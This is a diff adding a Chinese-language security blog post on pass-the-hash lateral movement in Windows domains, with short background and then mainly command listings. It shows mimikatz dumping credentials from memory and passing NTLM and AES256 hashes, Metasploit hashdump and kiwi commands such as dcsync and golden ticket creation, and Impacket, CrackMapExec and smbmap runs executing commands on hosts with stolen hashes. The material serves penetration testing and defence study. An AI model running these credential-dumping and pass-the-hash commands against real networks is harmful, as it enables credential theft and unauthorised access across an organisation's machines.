@@ -1,0 +1,351 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>域内横向（二） | Zoukba&#39;s gun</title>
+  <meta name="author" content="zoukba">
+  
+  <meta name="description" content="域内横向（二）哈希传递攻击产生在域环境中，用户登录计算机时使用的大都是域账号，在管理员大量安装域内计算机时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员的账号和密码都是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的计算机
+条件因为Windows Vista和2008开始，Windows操作系统默认禁用了LM Hash，因为在使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API转换成散列值。攻击者在获取散列值之后可以直接使用散列值进行传递攻击
+限制要想实现哈希传递，必须具有本地管理员权限
+传递攻击实现mimikatz"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="域内横向（二）"/>
+  <meta property="og:site_name" content="Zoukba&#39;s gun"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/[object Object]" title="Zoukba&#39;s gun" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zoukba&#39;s gun</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 域内横向（二）</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="域内横向（二）"><a href="#域内横向（二）" class="headerlink" title="域内横向（二）"></a>域内横向（二）</h1><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p>在域环境中，用户登录计算机时使用的大都是域账号，在管理员大量安装域内计算机时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员的账号和密码都是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的计算机</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>因为Windows Vista和2008开始，Windows操作系统默认禁用了LM Hash，因为在使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API转换成散列值。攻击者在获取散列值之后可以直接使用散列值进行传递攻击</p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>要想实现哈希传递，必须具有本地管理员权限</p>
+<h3 id="传递攻击实现"><a href="#传递攻击实现" class="headerlink" title="传递攻击实现"></a>传递攻击实现</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul>
+<li>使用NTLM Hash进行传递</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先dump下数据</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br><span class="line"><span class="comment">#传递</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:ZOUKBA.com /ntlm:7365e3b22baeaebc0************&quot;</span></span><br><span class="line"><span class="comment">#之后会弹出一个会话</span></span><br><span class="line">dir \\192.168.1.20\C$	<span class="comment">#尝试列出目标机上c盘下的文件</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用AES-256密钥进行哈希传递（需要安装KB2871997）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先dump下数据</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span></span><br><span class="line"><span class="comment">#传递</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:ZOUKBA.com /aes256:7365e3b22baeaebc0************&quot;</span></span><br><span class="line"><span class="comment">#弹出会话</span></span><br><span class="line">dir \\dc\C$			<span class="comment">#列出目标机上c盘下的文件</span></span><br></pre></td></tr></table></figure>
+<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul>
+<li>内置模块</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hashdump			<span class="comment">#dump hash值</span></span><br><span class="line"></span><br><span class="line">load mimikatz		<span class="comment">#加载mimikatz模块，以下是输入</span></span><br><span class="line">msv					<span class="comment">#获取的是hash值 </span></span><br><span class="line">tspkg 				<span class="comment">#tspkg凭证相关的模块 </span></span><br><span class="line">wdigest 			<span class="comment">#读取内存中存放的账号密码明文信息 </span></span><br><span class="line">kerberos 			<span class="comment">#kerberos相关的模块 </span></span><br><span class="line">ssp 				<span class="comment">#获取的是明文信息</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>KiWi模块</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kiwi是默认加载32位系统的，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后用migrate命令将meterpreter进程迁移到一个64位程序的进程中</span></span><br><span class="line">migrate &lt;pid&gt;</span><br><span class="line">load kiwi</span><br><span class="line"><span class="comment">#命令</span></span><br><span class="line">creds_all 			<span class="comment">#列举所有凭据</span></span><br><span class="line">creds_kerberos		<span class="comment">#列举所有kerberos凭据</span></span><br><span class="line">creds_msv			<span class="comment">#列举所有msv凭据</span></span><br><span class="line">creds_ssp			<span class="comment">#列举所有ssp凭据</span></span><br><span class="line">creds_tspkg			<span class="comment">#列举所有tspkg凭据 </span></span><br><span class="line">creds_wdigest		<span class="comment">#列举所有wdigest凭据 </span></span><br><span class="line">dcsync				<span class="comment">#通过DCSync检索用户帐户信息 </span></span><br><span class="line">dcsync_ntlm			<span class="comment">#通过DCSync检索用户帐户NTLM散列、SID和RID </span></span><br><span class="line">golden_ticket_create	<span class="comment">#创建黄金票据 </span></span><br><span class="line">kerberos_ticket_list	<span class="comment">#列举kerberos票据 </span></span><br><span class="line">kerberos_ticket_purge	<span class="comment">#清除kerberos票据 </span></span><br><span class="line">kerberos_ticket_use		<span class="comment">#使用kerberos票据 </span></span><br><span class="line">kiwi_cmd			<span class="comment">#执行mimikatz的命令，后面接mimikatz.exe的命令 </span></span><br><span class="line">lsa_dump_sam		<span class="comment">#dump出lsa的SAM </span></span><br><span class="line">lsa_dump_secrets	<span class="comment">#dump出lsa的密文 </span></span><br><span class="line">password_change		<span class="comment">#修改密码 </span></span><br><span class="line">wifi_list			<span class="comment">#列出当前用户的wifi配置文件 </span></span><br><span class="line">wifi_list_shared	<span class="comment">#列出共享wifi配置文件/编码</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>psexec的三个模块</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行单个命令的PTH模块</span></span><br><span class="line">auxiliary/admin/smb/psexec_command </span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行直接就获取到meterpreter的PTH模块 </span></span><br><span class="line">exploit/windows/smb/psexec </span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持对一个网段进行PTH进行验证的模块 </span></span><br><span class="line">exploit/windows/smb/psexec_psh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
+<ul>
+<li>psexec.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -Hashes :&lt;<span class="built_in">hash</span>&gt; 域/域用户名@192.168.10.2</span><br><span class="line">python3 psexec.py 用户名:密码@目标IP</span><br></pre></td></tr></table></figure>
+<ul>
+<li>  smbexec.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -Hashes :&lt;<span class="built_in">hash</span>&gt; 域/域用户名@192.168.10.2</span><br><span class="line">python3 smbexec.py 用户名:密码@目标IP</span><br></pre></td></tr></table></figure>
+<ul>
+<li>  wmiexec.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes &lt;LM-Hash&gt;:&lt;NT-Hash&gt; 域名/域用户名@192.168.10.2</span><br><span class="line">python3 wmiexec.py 用户名:密码@目标IP</span><br></pre></td></tr></table></figure>
+<h4 id="CrackMapExec-用于传递命令"><a href="#CrackMapExec-用于传递命令" class="headerlink" title="CrackMapExec(用于传递命令)"></a>CrackMapExec(用于传递命令)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install pipx</span><br><span class="line">pipx ensurepath</span><br><span class="line">pipx install crackmapexec</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 192.168.10.2 -u administrator -H &lt;ntlm-hash&gt; -x whoami</span><br></pre></td></tr></table></figure>
+<h4 id="Smbmap（需要提供LM-Hash-NTLM-Hash）"><a href="#Smbmap（需要提供LM-Hash-NTLM-Hash）" class="headerlink" title="Smbmap（需要提供LM-Hash:NTLM-Hash）"></a>Smbmap（需要提供LM-Hash:NTLM-Hash）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbmap.py ‐u administrator ‐p 123456 ‐d &lt;域名&gt; ‐H 192.168.1.115 -x <span class="string">&#x27;ipconfig&#x27;</span></span><br><span class="line">python3 smbmap.py ‐u administrator ‐p &lt;LM-Hash:NTLM-Hash&gt; ‐d &lt;域名&gt; ‐H 192.168.1.115 -x <span class="string">&#x27;ipconfig&#x27;</span></span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/20/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/" class="leancloud-visitors view" data-flag-title="域内横向（二）">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/20/JS的那些事/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/内网杂七杂八/">内网杂七杂八<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/域内横向/">域内横向<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-article-text">域内横向（二）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-article-text">哈希传递攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%A7%E7%94%9F"><span class="toc-article-text">产生</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">条件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%99%90%E5%88%B6"><span class="toc-article-text">限制</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-article-text">传递攻击实现</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mimikatz"><span class="toc-article-text">mimikatz</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Metasploit"><span class="toc-article-text">Metasploit</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket"><span class="toc-article-text">Impacket</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#CrackMapExec-%E7%94%A8%E4%BA%8E%E4%BC%A0%E9%80%92%E5%91%BD%E4%BB%A4"><span class="toc-article-text">CrackMapExec(用于传递命令)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Smbmap%EF%BC%88%E9%9C%80%E8%A6%81%E6%8F%90%E4%BE%9BLM-Hash-NTLM-Hash%EF%BC%89"><span class="toc-article-text">Smbmap（需要提供LM-Hash:NTLM-Hash）</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 zoukba's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
